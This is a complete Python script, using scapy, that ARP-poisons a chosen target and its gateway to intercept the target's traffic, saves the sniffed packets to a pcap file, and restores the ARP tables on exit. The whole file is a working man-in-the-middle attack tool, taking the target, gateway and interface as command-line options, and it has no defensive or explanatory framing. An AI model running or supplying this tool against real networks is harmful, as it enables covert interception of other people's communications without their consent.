from scapy.all import *
import os
import sys
import threading
import signal
import time
import optparse

timestr = time.strftime("%Y%m%d_%H%M%S")
# use command line mode to receive arguments
#interface = "en1"
#target_ip = "192.168.1.15"
#gateway_ip = "192.168.1.1"
packet_count = 10000000000
poisoning = True


##### add the parser option #####

parser = optparse.OptionParser('usage % -t <target ip> -g <gateway ip> -i <interface>')

parser.add_option('-t', dest='target', type='string',help='spacify target ip')                                       
parser.add_option('-g', dest='gateway', type='string',help='spacify gateway ip')          
parser.add_option('-i', dest='interface', type='string',help='spacify your interface EX:eth0')                                       
(options, args) = parser.parse_args()    
if options.target == None or options.gateway == None or options.interface ==None: 
    print parser.usage
    sys.exit(0)


gateway_ip = options.gateway                                           
target_ip = options.target                                             
interface = options.interface


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # slightly different method using send
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gateway_mac), count=5)

def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)

    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src

    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning

    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"

    while poisoning:
        send(poison_target)
        send(poison_gateway)

        time.sleep(2)

    print "[*] APR poison attack finished."

    return


# set our interface
conf.iface = interface

# turn off output
conf.verb = 0

print "[*] Setting up %s" % interface





gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip, target_mac)

# start poison thread
poison_thread = threading.Thread(target=poison_target,
    args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets" % packet_count

    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

except KeyboardInterrupt:
    pass

finally:
    # write out the captured packets
    print "[*] Writing packets to arper.pcap"
    wrpcap( 'trace' + timestr + '.pcap' , packets)

    # get the poison thread to stop
    poisoning = False

    # wait for poisoning thread to exit
    poison_thread.join()

    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
